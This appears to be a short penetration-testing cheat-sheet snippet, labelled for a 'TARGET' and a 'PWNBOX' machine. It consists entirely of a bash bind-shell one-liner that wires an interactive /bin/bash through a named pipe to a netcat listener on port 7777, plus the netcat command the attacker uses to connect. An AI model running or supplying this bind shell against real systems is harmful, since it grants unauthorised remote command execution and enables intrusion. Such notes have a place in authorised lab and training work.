- TARGET 
```bash
# Starting the Netcat Listener
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 7777 > /tmp/f
```
- PWNBOX
```bash
nc -nv $TARGET 7777
```
